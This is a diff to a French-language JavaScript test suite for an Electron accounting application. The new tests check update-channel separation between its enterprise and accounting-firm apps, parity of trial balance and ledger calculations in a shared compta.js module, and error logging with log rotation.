@@ -4894,6 +4894,24 @@ t('cabinet : son canal de mise à jour ne peut pas écraser celui de l\'app entr
 
   assert.ok(cfg.publish && cfg.publish.channel, 'le cabinet doit publier sur un canal nommé');
   assert.notStrictEqual(cfg.publish.channel, 'latest', 'le canal « latest » est celui de l\'app entreprise');
+  // Depuis la 9.1.0 le canal du paquet se DÉDUIT du numéro de version, comme pour l'app entreprise
+  // depuis la 7.25.0 : une version stable va sur `cabinet`, une préversion sur `cabinet-beta`.
+  // On teste l'INTERRUPTEUR, pas la position dans laquelle il se trouve aujourd'hui (7.26.0).
+  const canalPaquet = v => {
+    const m = require('module');
+    const chemin = path.join(__dirname, '..', 'build', 'cabinet.config.js');
+    const vraie = pkg.version;
+    delete require.cache[require.resolve(chemin)];
+    delete require.cache[require.resolve(path.join(__dirname, '..', 'package.json'))];
+    require(path.join(__dirname, '..', 'package.json')).version = v;
+    const c = require(chemin).publish.channel;
+    require(path.join(__dirname, '..', 'package.json')).version = vraie;
+    delete require.cache[require.resolve(chemin)];
+    void m;
+    return c;
+  };
+  assert.strictEqual(canalPaquet('9.2.0'), 'cabinet', 'une version stable va sur le canal cabinet');
+  assert.strictEqual(canalPaquet('9.2.0-beta.1'), 'cabinet-beta', 'une préversion va sur le canal d\'essai');
   assert.strictEqual(cfg.publish.provider, 'github');
   assert.strictEqual(cfg.publish.repo, pkg.build.publish.repo, 'les deux applications publient dans le même dépôt');
 
@@ -4909,8 +4927,25 @@ t('cabinet : son canal de mise à jour ne peut pas écraser celui de l\'app entr
 
   // Et l'application doit demander CE canal, sinon elle recevrait les versions de l'app entreprise.
   const src = fs.readFileSync(path.join(__dirname, '..', 'src', 'cabinet', 'main.js'), 'utf8');
-  assert.ok(new RegExp(`UPDATE_CHANNEL = '${cfg.publish.channel}'`).test(src), 'le canal de l\'app et celui du paquet doivent être le même');
-  assert.ok(/autoUpdater\.channel = UPDATE_CHANNEL/.test(src));
+  // Les DEUX canaux que l'application peut demander sont exactement les deux sur lesquels le paquet
+  // peut être publié. Un canal qu'elle réclamerait et que personne ne publie ne donnerait aucune
+  // erreur : elle chercherait un fichier qui n'existe pas, pour toujours.
+  assert.ok(/readUpdateCfg\(\)\.beta \? 'cabinet-beta' : 'cabinet'/.test(src),
+    'l\'app cabinet doit choisir son canal sur le RÉGLAGE du poste, pas sur la version installée');
+  assert.ok(/autoUpdater\.channel = UPDATE_CHANNEL\(\)/.test(src));
+  // Et le canal se choisit sur le réglage, PAS sur la version qui tourne : quelqu'un qui décoche
+  // la case tourne encore sur une bêta jusqu'à la stable suivante, et doit bien la recevoir.
+  const iCanal = src.indexOf('autoUpdater.channel = UPDATE_CHANNEL()');
+  const iDown = src.indexOf('autoUpdater.allowDowngrade');
+  const iPre = src.indexOf('autoUpdater.allowPrerelease');
+  assert.ok(iCanal > 0 && iDown > iCanal, 'allowDowngrade se repose APRÈS le canal : l\'affectation de channel le remet à true (6.7.3)');
+  assert.ok(iPre > 0, 'allowPrerelease manque : sans lui, /releases/latest ignore les préversions PAR CONSTRUCTION et la bêta n\'est proposée à personne');
+  // La seule exception voulue à « jamais de retour en arrière » : sortir du canal d'essai.
+  assert.ok(/allowDowngrade = !beta && canalDeVersion\(VERSION\) !== 'latest'/.test(src),
+    'décocher la case doit permettre de redescendre : sinon on est enfermé dans la bêta qu\'on vient de quitter');
+  // Le cabinet ne charge PAS core.js (il n'est pas dans ses files) : `canalDe` y est recopié.
+  assert.ok(/const canalDeVersion = /.test(src) && !/\bC\.canalDe\(/.test(src),
+    'l\'app cabinet ne peut pas appeler core.js : la règle du canal y est recopiée');
   // macOS n'est pas signé : Squirrel ne peut pas installer, c'est mac-update.sh qui remplace l'app.
   assert.ok(/MAC_SIGNED = false/.test(src) && /mac-update\.sh/.test(src));
   const sh = fs.readFileSync(path.join(__dirname, '..', 'src', 'mac-update.sh'), 'utf8');
@@ -4943,6 +4978,11 @@ t('cabinet : la clé privée ne traverse jamais le pont vers l\'interface', () =
     dossiers: [{ id: 'MF:1', name: 'Client', packs: [] }], settings: { relanceDay: 10 }
   };
   // Le corps référence `state` et `Z.keyFingerprint` : on les fournit, et rien d'autre.
+  // `new Function` est délibéré ici, et c'est la seule façon d'y arriver : on veut EXÉCUTER le
+  // vrai corps de `safeState()` tel qu'il est écrit dans main.js, pour prouver que la clé privée
+  // n'en sort pas. Le réécrire dans le test ne prouverait rien (« un e2e ne doit jamais rejouer
+  // le code qu'il teste », 6.8.1).
+  // eslint-disable-next-line no-new-func
   const faireSafeState = new Function('state', 'Z', corps + '; return safeState();');
   const sorti = faireSafeState(faux, { keyFingerprint: k => 'EMPREINTE-DE-' + k });
   const texte = JSON.stringify(sorti);
@@ -5844,7 +5884,14 @@ t('cabinet : aucun de ses fichiers n\'appelle une fonction qui n\'existe pas', (
 
 t('cabinet : un import de vingt paquets parle, s\'arrête, et son interface est surveillée', () => {
   const main = fs.readFileSync(path.join(__dirname, '..', 'src', 'cabinet', 'main.js'), 'utf8');
-  const pre = fs.readFileSync(path.join(__dirname, '..', 'src', 'cabinet', 'preload.js'), 'utf8');
+  // Les commentaires partent AVANT de juger : ce contrôle-ci est le jumeau de celui de la 6.8.0,
+  // et il n'avait jamais reçu son nettoyage. Un commentaire qui explique la règle en CITANT les deux
+  // appels interdits le faisait échouer sur du code parfaitement correct — un test trop étroit
+  // accuse du code juste, ce qui est pire que pas de test. Une règle apprise d'un côté se vérifie
+  // de l'autre, à la main (7.3.0) : celle-ci ne l'avait pas été.
+  const preBrut = fs.readFileSync(path.join(__dirname, '..', 'src', 'cabinet', 'preload.js'), 'utf8');
+  const pre = preBrut.replace(/\/\*[\s\S]*?\*\//g, '').replace(/^\s*\/\/.*$/gm, '');
+  assert.ok(pre.includes('contextBridge.exposeInMainWorld'), 'le nettoyage des commentaires a mangé le préchargement');
   const app = fs.readFileSync(path.join(__dirname, '..', 'src', 'cabinet', 'renderer', 'app.js'), 'utf8');
 
   // ---- la boucle d'import rend la main ----
@@ -6284,6 +6331,16 @@ t('audit A9 : un paquet dont le fichier a disparu se signale', () => {
     assert.strictEqual(W.fichierAutorise('app', 'cabinet-mac.yml'), false);
     assert.strictEqual(W.fichierAutorise('cabinet', 'latest-mac.yml'), false);
     assert.strictEqual(W.fichierAutorise('cabinet', 'cabinet-mac.yml'), true);
+    // Le canal d'essai du cabinet (9.1.0). Les trois fichiers, et l'étanchéité dans les deux sens :
+    // un cabinet ne doit pas plus recevoir `beta.yml` (l'essai de l'app entreprise) qu'une
+    // entreprise ne doit recevoir `cabinet-beta.yml`. Rien ne planterait — ils installeraient juste
+    // le mauvais logiciel, en version d'essai.
+    ['cabinet-beta.yml', 'cabinet-beta-mac.yml', 'cabinet-beta-linux.yml'].forEach(f => {
+      assert.strictEqual(W.fichierAutorise('cabinet', f), true, 'canal d\'essai du cabinet : ' + f);
+      assert.strictEqual(W.fichierAutorise('app', f), false, 'servi à tort sur le canal entreprise : ' + f);
+    });
+    ['beta.yml', 'beta-mac.yml', 'beta-linux.yml'].forEach(f =>
+      assert.strictEqual(W.fichierAutorise('cabinet', f), false, 'l\'essai de l\'app entreprise servi au cabinet : ' + f));
     assert.strictEqual(W.fichierAutorise('app', 'SkanFact-6.6.0-mac-universal.zip'), true);
     assert.strictEqual(W.fichierAutorise('app', 'SkanFact-Cabinet-6.6.0-mac-universal.zip'), false, 'préfixe du cabinet servi sur le canal entreprise');
     assert.strictEqual(W.fichierAutorise('cabinet', 'SkanFact-Cabinet-6.6.0-win-x64.exe'), true);
@@ -6404,7 +6461,13 @@ t('audit A9 : un paquet dont le fichier a disparu se signale', () => {
       // 5. Jamais de retour en arrière : installer une version plus ancienne, c'est réinstaller un
       // défaut déjà corrigé. Piège d'electron-updater : affecter `channel` remet allowDowngrade à
       // true — c'est ce qui a fait proposer la 6.7.1 à une application en 6.7.2.
-      assert.ok(/allowDowngrade = false/.test(src), nom + ' : le retour en arrière n\'est pas interdit');
+      // Deux formes acceptées, et deux seulement : la valeur figée `false`, ou l'exception écrite
+      // — sortir du canal d'essai, où interdire de reculer enfermerait dans la bêta qu'on vient de
+      // quitter (7.25.0). L'app entreprise porte les deux ; l'app cabinet n'a que la seconde depuis
+      // la 9.1.0, et la première version de ce test, qui exigeait `= false` au caractère près, la
+      // faisait tomber sur du code juste.
+      assert.ok(/allowDowngrade = false/.test(src) || /allowDowngrade = !beta &&/.test(src),
+        nom + ' : le retour en arrière n\'est pas interdit');
       // La règle vaut pour TOUTE affectation de canal, quel que soit le nom de la variable qui
       // porte l'objet : `autoUpdater.channel` dans l'app cabinet, `u.channel` dans l'app entreprise
       // depuis que le canal bêta se pose dans `appliquerCanal(u)`. Chercher la seule forme
@@ -7699,11 +7762,16 @@ t('audit A9 : un paquet dont le fichier a disparu se signale', () => {
     noms.forEach((nom, i) => {
       const f = path.join(dossier, nom + '.json');
       fs.writeFileSync(f, JSON.stringify({ ...core.DEFAULT_DATA, company: { ...core.DEFAULT_COMPANY, name: nom } }));
+      // `new Date(y, m, d)` est délibéré ici : un mtime est un INSTANT du système de fichiers,
+      // pas un jour de calendrier — la règle UTC de la 5.2.3 ne le concerne pas. Et c'est tout
+      // l'objet de ce test : montrer que le mtime ne décide de rien, c'est le NOM qui fait foi.
+      // eslint-disable-next-line no-restricted-syntax
       fs.utimesSync(f, new Date(2020, 0, 1 + i), new Date(2020, 0, 1 + i));   // les plus vieilles
     });
     // Le filet, pris à l'instant : le plus RÉCENT de tous, et le premier par ordre alphabétique.
     const filet = path.join(dossier, 'avant-effacement-2026-09-12.json');
     fs.writeFileSync(filet, JSON.stringify({ ...core.DEFAULT_DATA, company: { ...core.DEFAULT_COMPANY, name: 'FILET' } }));
+    // eslint-disable-next-line no-restricted-syntax
     fs.utimesSync(filet, new Date(2026, 8, 12), new Date(2026, 8, 12));
 
     s.backupNow('manuelle');            // déclenche la purge
@@ -7720,6 +7788,7 @@ t('audit A9 : un paquet dont le fichier a disparu se signale', () => {
     // de 6.8.1 intact, sur la seule plateforme que personne ne testait. Depuis, les filets ont
     // leur propre réserve, comme dans l'app cabinet.
     fs.readdirSync(dossier).forEach(n => {
+      // eslint-disable-next-line no-restricted-syntax
       const q = new Date(2026, 8, 12);
       fs.utimesSync(path.join(dossier, n), q, q);
     });
@@ -10511,6 +10580,1261 @@ t('audit A9 : un paquet dont le fichier a disparu se signale', () => {
         assert.ok(fichier.includes('CREATE TABLE IF NOT EXISTS ' + tbl + ' '), 'table absente du fichier à coller : ' + tbl));
     });
   }
+
+
+  // ---------------------------------------------------------------- compta.js (9.1.0)
+  //
+  // Le module partagé par les deux applications. Ce qu'il faut prouver n'est pas qu'il calcule
+  // quelque chose — c'est qu'il calcule LA MÊME CHOSE que core.js sur la même matière. Sans ça, le
+  // comptable et son client auraient deux balances et aucun moyen de savoir laquelle croire.
+
+  t('9.1.0 : compta.js ne dépend de rien, et son arrondi est celui de core.js au caractère près', () => {
+    const src = lireSource('src', 'renderer', 'compta.js');
+    const net = src.replace(/\/\*[\s\S]*?\*\//g, '').split('\n').filter(l => !/^\s*\/\//.test(l)).join('\n');
+    assert.ok(net.includes('function balanceDepuisLignes') && net.includes('function lettrageDepuisLignes'),
+      'le nettoyage des commentaires a mangé le code');
+    // Un appel à core.js rendrait le module inutilisable par le cabinet, qui ne le charge pas —
+    // et rien ne le dirait avant que l'écran reste blanc chez le comptable.
+    assert.ok(!/require\(|SkanCore/.test(net), 'compta.js ne doit dépendre ni de core.js ni d\'un require');
+
+    // Deux arrondis qui divergent d'un millime, c'est une balance qui ne tombe plus juste et
+    // personne qui sait pourquoi. On compare les deux corps, pas leur comportement.
+    const corps = s => (s.match(/function round3\(n\) \{[^\n]*\}/) || [''])[0];
+    const a = corps(src), b = corps(lireSource('src', 'renderer', 'core.js'));
+    assert.ok(a && a === b, `round3 diverge :\n  compta : ${a}\n  core   : ${b}`);
+  });
+
+  t('9.1.0 : compta.js est chargé AVANT core.js, dans les deux applications, et embarqué par le cabinet', () => {
+    // Trois branchements obligatoires pour un fichier partagé (règle 7.29.0) : l'index de chaque
+    // application, dans le bon ORDRE, et les `files` du paquet cabinet — sans quoi l'app du
+    // comptable démarre en développement et plante une fois construite (7.26.0).
+    const ent = lireSource('src', 'renderer', 'index.html');
+    assert.ok(ent.indexOf('compta.js') > 0 && ent.indexOf('compta.js') < ent.indexOf('src="core.js"'),
+      'compta.js doit se charger avant core.js dans l\'app entreprise');
+    const cab = lireSource('src', 'cabinet', 'renderer', 'index.html');
+    assert.ok(cab.includes('renderer/compta.js'), 'l\'app cabinet ne charge pas compta.js');
+    assert.ok(cab.indexOf('renderer/compta.js') < cab.indexOf('cabcore.js'),
+      'compta.js doit se charger avant cabcore.js');
+    assert.ok(lireSource('build', 'cabinet.config.js').includes("'src/renderer/compta.js'"),
+      'compta.js absent des files de build/cabinet.config.js : l\'app cabinet plantera une fois construite');
+    // Et core.js le réexporte : aucun appelant n'a eu à changer.
+    assert.ok(lireSource('src', 'renderer', 'core.js').includes('Compta.entriesBalance'),
+      'core.js doit réexporter entriesBalance depuis compta.js');
+  });
+
+  // TEST-9.1.0-001
+  t('9.1.0 : une écriture n\'entre qu\'équilibrée, et le refus dit LEQUEL des sept motifs', () => {
+    const K = require('../src/renderer/compta.js');
+    const bonne = { date: '2026-03-10', journal: 'VE', lignes: [{ compte: '411', debit: 119 }, { compte: '707', credit: 100 }, { compte: '4367', credit: 19 }] };
+    assert.ok(K.ecritureValide(bonne).ok);
+    assert.strictEqual(K.ecritureValide(bonne).motif, '');
+
+    const cas = [
+      [{ ...bonne, lignes: [{ compte: '411', debit: 119 }, { compte: '707', credit: 100 }] }, /ne tombe pas juste/],
+      [{ ...bonne, lignes: [{ compte: '411', debit: 119 }] }, /au moins deux lignes/],
+      [{ ...bonne, lignes: [{ compte: '', debit: 1 }, { compte: '707', credit: 1 }] }, /compte manque/],
+      [{ ...bonne, lignes: [{ compte: '411', debit: 1, credit: 1 }, { compte: '707', credit: 1 }] }, /débit OU au crédit/],
+      [{ ...bonne, lignes: [{ compte: '411', debit: -1 }, { compte: '707', credit: -1 }] }, /négatif change de colonne/],
+      [{ ...bonne, date: '' }, /date manque/],
+      [{ ...bonne, journal: '' }, /journal manque/]
+    ];
+    cas.forEach(([od, rx], i) => {
+      const v = K.ecritureValide(od);
+      assert.ok(!v.ok, `cas ${i + 1} : accepté alors qu'il ne devrait pas`);
+      assert.ok(v.motifs.some(m => rx.test(m)), `cas ${i + 1} : motif attendu ${rx} — reçu ${JSON.stringify(v.motifs)}`);
+    });
+    // Le premier motif est celui qu'on montre : sept phrases devant une seule faute, c'est
+    // demander à l'utilisateur de les trier lui-même.
+    assert.strictEqual(K.ecritureValide(cas[5][0]).motif, K.ecritureValide(cas[5][0]).motifs[0]);
+    // Un compte hors plan se SIGNALE, il ne fait jamais refuser : chaque cabinet a le sien (6.3.0).
+    const hors = K.ecritureValide(bonne, ['411', '707']);
+    assert.ok(!hors.ok && /n'est pas dans le plan/.test(hors.motif) && /à vérifier/.test(hors.motif));
+  });
+
+  // TEST-9.1.0-002
+  t('9.1.0 : le CSV d\'écritures se lit par NOM de colonne, dans les trois écritures de montant', () => {
+    const K = require('../src/renderer/compta.js');
+    // L'ordre des colonnes est volontairement mélangé, et le BOM posé en tête comme le fait un
+    // tableur : associer par position mettrait des montants dans « Tiers » sans rien casser (6.8.0).
+    const csv = '﻿Crédit;Compte;Date;Libellé;Débit;Journal;Pièce;Tiers\n'
+      + '0;411;2026-03-10;"Facture FAC-2026-001; solde";1234,567;VE;FAC-2026-001;Trabelsi\n'
+      + '1.234,567;707;2026-03-10;Vente;0;VE;FAC-2026-001;\n'
+      + '0;;2026-03-10;ligne sans compte;99;VE;X;\n';
+    const l = K.entreesDepuisCsv(csv);
+    assert.strictEqual(l.length, 2);
+    assert.strictEqual(l.ignorees, 1, 'une ligne sans compte s\'ignore ET se compte');
+    assert.strictEqual(l[0].account, '411');
+    assert.strictEqual(l[0].debit, 1234.567);
+    assert.strictEqual(l[0].label, 'Facture FAC-2026-001; solde', 'le point-virgule entre guillemets appartient au libellé');
+    assert.strictEqual(l[0].tiers, 'Trabelsi');
+    assert.strictEqual(l[1].credit, 1234.567, '« 1.234,567 » : c\'est le séparateur le plus à droite qui décide');
+    // Les trois écritures du même nombre, et rien d'autre.
+    assert.strictEqual(K.nombreDepuisCsv('1,234.567'), 1234.567);
+    assert.strictEqual(K.nombreDepuisCsv('1 234,567'), 1234.567);
+    assert.strictEqual(K.nombreDepuisCsv(''), 0);
+    // Une tabulation à la place du point-virgule : un tableur anglophone, et le refuser
+    // n'apprendrait rien à personne.
+    const tab = K.entreesDepuisCsv('Compte\tDébit\tCrédit\n411\t10\t0\n707\t0\t10\n');
+    assert.strictEqual(tab.length, 2);
+    assert.strictEqual(tab[0].debit, 10);
+    // Sans colonne « Compte », ce n'est pas un fichier d'écritures : on le DIT, au lieu de rendre
+    // deux cents lignes vides. Un import qui réussit sur rien est pire qu'un import qui refuse.
+    const rien = K.entreesDepuisCsv('Nom;Prénom\nDupont;Jean\n');
+    assert.strictEqual(rien.entete, false);
+    assert.strictEqual(rien.length, 0);
+  });
+
+  // TEST-9.1.0-004, 005, 006 — et le test qui compte : la PARITÉ.
+  t('9.1.0 : la balance du cabinet est celle de l\'entreprise, au millime, sur les 24 mois de l\'exemple', () => {
+    const K = require('../src/renderer/compta.js');
+    const demo = require('../src/renderer/demo.js');
+    const company = { ...core.DEFAULT_COMPANY, name: 'Parité SUARL', matricule: '1234567A' };
+    const data = core.migrateData(demo.buildDemoData(company, '2026-09-12'));
+    let mois = 0;
+    for (const year of [2025, 2026]) {
+      for (let m = 1; m <= 12; m++) {
+        const p = core.packPeriod(year, m);
+        // Côté entreprise : les pièces. Côté cabinet : les mêmes écritures, passées par le CSV du
+        // paquet — c'est exactement le chemin que suit un paquet réel.
+        const ref = core.balanceGenerale(data, data.company, p, {});
+        const entries = core.journalEntries(data, data.company, p, {});
+        const ouverture = core.soldesOuverture(data, data.company, p, {});
+        const csv = core.toCsv(entries, core.entryCsvColumns());
+        const relues = K.entreesDepuisCsv(csv);
+        assert.strictEqual(relues.length, entries.length, `${year}-${m} : ${entries.length - relues.length} ligne(s) perdue(s) par le CSV`);
+
+        const bal = K.balanceDepuisLignes(relues, ouverture);
+        assert.strictEqual(bal.ok, ref.equilibree, `${year}-${m} : les deux ne disent pas la même chose sur l'équilibre`);
+        assert.strictEqual(bal.rows.length, ref.rows.length, `${year}-${m} : ${bal.rows.length} comptes contre ${ref.rows.length}`);
+        ['ouvertureD', 'ouvertureC', 'debit', 'credit', 'soldeD', 'soldeC'].forEach(k =>
+          assert.strictEqual(bal.totaux[k], ref.totals[k], `${year}-${m} : total ${k} — cabinet ${bal.totaux[k]} ≠ entreprise ${ref.totals[k]}`));
+        bal.rows.forEach((r, i) => {
+          const o = ref.rows[i];
+          assert.strictEqual(r.account, o.account, `${year}-${m} : comptes dans un ordre différent`);
+          ['ouvertureD', 'ouvertureC', 'debit', 'credit', 'soldeD', 'soldeC'].forEach(k =>
+            assert.strictEqual(r[k], o[k], `${year}-${m} compte ${r.account} : ${k} — cabinet ${r[k]} ≠ entreprise ${o[k]}`));
+        });
+
+        // Le grand livre : chaque solde progressif finit sur le solde de la balance. C'est cette
+        // égalité qui fait qu'un grand livre se lit.
+        const gl = K.grandLivreDepuisLignes(relues, '', ouverture);
+        gl.comptes.forEach(c => {
+          const b = bal.rows.find(r => r.account === c.account);
+          assert.strictEqual(c.solde, round3(b.soldeD - b.soldeC), `${year}-${m} compte ${c.account} : le grand livre ne finit pas sur la balance`);
+          if (c.lignes.length) assert.strictEqual(c.lignes[c.lignes.length - 1].solde, c.solde, `${year}-${m} compte ${c.account} : la dernière ligne n'est pas le solde`);
+        });
+        mois++;
+      }
+    }
+    assert.strictEqual(mois, 24);
+    function round3(n) { return Math.round((Number(n) || 0) * 1000) / 1000; }
+  });
+
+  // TEST-9.1.0-006
+  t('9.1.0 : le livre-journal numérote 1..n par (date, pièce), et le centralisateur totalise le même', () => {
+    const K = require('../src/renderer/compta.js');
+    const demo = require('../src/renderer/demo.js');
+    const company = { ...core.DEFAULT_COMPANY, name: 'Journal SUARL', matricule: '1234567A' };
+    const data = core.migrateData(demo.buildDemoData(company, '2026-09-12'));
+    const p = { from: '2026-01-01', to: '2026-12-31' };
+    const entries = core.journalEntries(data, data.company, p, {});
+    const relues = K.entreesDepuisCsv(core.toCsv(entries, core.entryCsvColumns()));
+    const lj = K.journalDepuisLignes(relues);
+
+    assert.ok(lj.pieces.length > 20, 'trop peu de pièces sur une année de l\'exemple');
+    // Numérotation continue, sans trou : c'est la seule chose qu'un livre-journal doit garantir.
+    lj.pieces.forEach((pc, i) => assert.strictEqual(pc.numero, i + 1, `trou de numérotation en ${i + 1}`));
+    // Et dans l'ordre des dates : une pièce de mars ne peut pas porter un numéro d'avant janvier.
+    for (let i = 1; i < lj.pieces.length; i++) {
+      assert.ok(lj.pieces[i].date >= lj.pieces[i - 1].date, `pièce ${i + 1} datée avant la précédente`);
+    }
+    assert.strictEqual(lj.off.length, 0, `${lj.off.length} pièce(s) déséquilibrée(s) : ${JSON.stringify(lj.off.slice(0, 2))}`);
+    assert.strictEqual(lj.debit, lj.credit);
+    // Le même comparé à core.js, qui le calcule depuis les pièces.
+    assert.strictEqual(lj.debit, core.entriesBalance(entries).debit);
+
+    const cz = K.centralisateurDepuisLignes(relues);
+    const somme = f => Math.round(cz.reduce((s, r) => s + f(r), 0) * 1000) / 1000;
+    assert.strictEqual(somme(r => r.debit), lj.debit, 'le centralisateur ne totalise pas le journal');
+    assert.strictEqual(somme(r => r.credit), lj.credit);
+    assert.strictEqual(cz.reduce((s, r) => s + r.pieces, 0), lj.pieces.length, 'le centralisateur ne compte pas les mêmes pièces');
+    cz.forEach(r => assert.ok(/^\d{4}-\d{2}$/.test(r.mois) && r.journal, 'un mois ou un journal vide dans le centralisateur'));
+  });
+
+  // TEST-9.1.0-007
+  t('9.1.0 : le lettrage — ce qui reste ouvert EST le solde du compte', () => {
+    const K = require('../src/renderer/compta.js');
+    const demo = require('../src/renderer/demo.js');
+    const company = { ...core.DEFAULT_COMPANY, name: 'Lettrage SUARL', matricule: '1234567A' };
+    const data = core.migrateData(demo.buildDemoData(company, '2026-09-12'));
+    const p = { from: '2025-01-01', to: '2026-12-31' };
+    const entries = core.journalEntries(data, data.company, p, {});
+    const relues = K.entreesDepuisCsv(core.toCsv(entries, core.entryCsvColumns()));
+    const acc = core.chartAccounts(data);
+
+    const l = K.lettrageDepuisLignes(relues, acc.clients, '2026-09-12');
+    assert.ok(l.rows.length, 'aucun tiers dans le lettrage clients');
+    // LE contrôle. Il ne se remplace par aucun équilibre : c'est lui qui a trouvé, en 8.9.0, une
+    // facture couverte par un avoir dont l'écriture sautait pendant que celle de l'avoir restait.
+    assert.ok(l.concorde, `le reste ouvert (${l.resteOuvert}) n'est pas le solde du compte (${l.soldeCompte}) — écart ${l.ecart}`);
+    // Et il concorde avec la balance du même compte, qui vient de l'autre chemin.
+    const bal = K.balanceDepuisLignes(relues);
+    const client = bal.rows.filter(r => r.account.startsWith(acc.clients));
+    const solde = Math.round(client.reduce((s, r) => s + r.soldeD - r.soldeC, 0) * 1000) / 1000;
+    assert.strictEqual(l.resteOuvert, solde, 'le lettrage et la balance ne voient pas le même compte client');
+
+    // Une pièce lettrée sort des ouverts sans disparaître du compte : elle est réglée, la montrer
+    // noierait ce qui reste vraiment à réclamer.
+    const lignes = [
+      { account: '411', tiers: 'A', piece: 'F1', date: '2026-01-05', debit: 100, credit: 0, lettre: 'AA' },
+      { account: '411', tiers: 'A', piece: 'R1', date: '2026-01-20', debit: 0, credit: 100, lettre: 'AA' },
+      { account: '411', tiers: 'B', piece: 'F2', date: '2026-02-05', debit: 60, credit: 0, lettre: '', echeance: '2026-03-05' }
+    ];
+    const l2 = K.lettrageDepuisLignes(lignes, '411', '2026-09-12');
+    assert.strictEqual(l2.ouverts, 1);
+    assert.strictEqual(l2.resteOuvert, 60);
+    assert.strictEqual(l2.soldeCompte, 60);
+    assert.ok(l2.concorde);
+    // DEUX pièces lettrées, pas une : la lettre « AA » relie une facture ET son règlement, et
+    // c'est en pièces qu'un comptable compte ce qui est soldé.
+    assert.strictEqual(l2.rows.find(r => r.tiers === 'A').lettrees, 2);
+    assert.strictEqual(l2.rows.find(r => r.tiers === 'B').ouverts[0].retard, true, 'une échéance dépassée doit se voir');
+    assert.strictEqual(l2.lettragesFaux.length, 0);
+
+    // Un lettrage FAUX — 100 de facture lettrés contre 60 de règlement — se nomme, avec sa lettre
+    // et son écart. Sans ça il n'apparaîtrait que dans « le reste ouvert n'est pas le solde », une
+    // phrase vraie qui n'apprend rien.
+    const faux = K.lettrageDepuisLignes([
+      { account: '411', tiers: 'C', piece: 'F3', date: '2026-01-05', debit: 100, credit: 0, lettre: 'BB' },
+      { account: '411', tiers: 'C', piece: 'R3', date: '2026-01-20', debit: 0, credit: 60, lettre: 'BB' }
+    ], '411', '2026-09-12');
+    assert.strictEqual(faux.lettragesFaux.length, 1);
+    assert.strictEqual(faux.lettragesFaux[0].lettre, 'BB');
+    assert.strictEqual(faux.lettragesFaux[0].ecart, 40);
+    assert.strictEqual(faux.soldeCompte, 40, 'l\'argent reste sur le compte, quoi qu\'en dise le lettrage');
+  });
+
+
+  // ---------------------------------------------------------------- outillage (9.1.0)
+
+  t('9.1.0 : une erreur de l\'interface part au journal, sans fenêtre et sans rechargement', () => {
+    // SPEC-OUT-004. On juge la STRUCTURE, jamais la mention : un commentaire qui cite la règle
+    // qu'on cherche l'a déjà satisfaite deux fois dans l'histoire de ce dépôt (6.8.0, 7.25.0).
+    [['src', 'renderer', 'app.js'], ['src', 'cabinet', 'renderer', 'app.js']].forEach(chemin => {
+      const brut = lireSource(...chemin);
+      const net = brut.replace(/\/\*[\s\S]*?\*\//g, '').split('\n').filter(l => !/^\s*\/\//.test(l)).join('\n');
+      assert.ok(net.length > brut.length * 0.5, chemin.join('/') + ' : le nettoyage a mangé le code');
+      const qui = chemin.join('/');
+
+      // Les deux écouteurs, et les DEUX : une promesse rejetée ne passe pas par `error`, et c'est
+      // le cas le plus courant ici puisque tout ce qui traverse le pont est asynchrone.
+      assert.ok(/addEventListener\('error',/.test(net), qui + ' : pas de garde-fou sur « error »');
+      assert.ok(/addEventListener\('unhandledrejection',/.test(net), qui + ' : pas de garde-fou sur « unhandledrejection »');
+
+      // Posé AVANT la séquence de démarrage. Une exception levée pendant cette séquence laisse
+      // l'écran blanc — et c'est très exactement celle qu'un garde-fou installé plus bas ne
+      // verrait pas. Le chien de garde a la même règle depuis la 6.5.0, et c'est le seul repère
+      // fiable : il est le premier abonnement de la fin du fichier.
+      const iGarde = net.indexOf("addEventListener('error',");
+      const iChien = net.search(/\b(bridge|api)\.onAlivePing\(\)/);
+      assert.ok(iChien > 0 && iGarde > 0 && iGarde < iChien,
+        qui + ' : le garde-fou doit être posé AVANT le chien de garde et la séquence de démarrage');
+
+      // Et il n'affiche rien. On regarde le corps des deux écouteurs, pas le fichier entier — la
+      // zone part de la fonction qui les sert, déclarée juste au-dessus.
+      const iNote = net.lastIndexOf('noterErreur', iGarde);
+      const corps = net.slice(iNote > 0 ? iNote : iGarde, iChien);
+      assert.ok(!/\bmodal\(|\balert\(|location\.reload\(/.test(corps),
+        qui + ' : le garde-fou ne doit ni ouvrir de fenêtre ni recharger la page');
+      assert.ok(/supportErreur\(/.test(corps), qui + ' : le garde-fou doit passer par supportErreur');
+      // Les deux écouteurs passent bien par elle, et pas seulement l'un des deux.
+      assert.strictEqual((corps.match(/noterErreur\(\{/g) || []).length, 2,
+        qui + ' : les DEUX écouteurs doivent journaliser');
+    });
+
+    // Côté processus principal : le handler existe dans les deux, il journalise, et il se TAIT
+    // au-delà de vingt par minute — un renderer en boucle ne doit pas remplir le disque.
+    [['src', 'main.js'], ['src', 'cabinet', 'main.js']].forEach(chemin => {
+      const net = lireSource(...chemin).replace(/\/\*[\s\S]*?\*\//g, '').split('\n').filter(l => !/^\s*\/\//.test(l)).join('\n');
+      const qui = chemin.join('/');
+      assert.ok(net.includes("ipcMain.handle('support:erreur'"), qui + ' : pas de handler support:erreur');
+      const i = net.indexOf("ipcMain.handle('support:erreur'");
+      const corps = net.slice(i, i + 1200);
+      assert.ok(/logToFile\(/.test(corps), qui + ' : support:erreur n\'écrit pas au journal');
+      assert.ok(/>=\s*20/.test(corps), qui + ' : pas de plafond de vingt erreurs par minute');
+      assert.ok(!/showErrorBox|showMessageBox|reload\(/.test(corps),
+        qui + ' : support:erreur ne doit ni ouvrir de fenêtre ni recharger');
+    });
+  });
+
+  t('9.1.0 : le journal tourne à 2 Mo, une fois, et rien n\'écrit à côté de lui', () => {
+    [['src', 'main.js'], ['src', 'cabinet', 'main.js']].forEach(chemin => {
+      const net = lireSource(...chemin).replace(/\/\*[\s\S]*?\*\//g, '').split('\n').filter(l => !/^\s*\/\//.test(l)).join('\n');
+      const qui = chemin.join('/');
+      const i = net.indexOf('function logToFile');
+      assert.ok(i > 0, qui + ' : logToFile introuvable');
+      const corps = net.slice(i, net.indexOf('\n}', i));
+      assert.ok(/statSync/.test(corps) && /renameSync/.test(corps), qui + ' : logToFile ne tourne pas');
+      assert.ok(/LOG_MAX/.test(corps), qui + ' : la borne doit être nommée, pas écrite en dur dans la condition');
+      assert.ok(/2 \* 1024 \* 1024/.test(net), qui + ' : LOG_MAX doit valoir 2 Mo');
+      // UNE rotation, pas deux : deux fichiers au maximum, donc 4 Mo au pire. Une rotation
+      // numérotée à cinq donnerait 10 Mo pour une information que personne ne lit jamais.
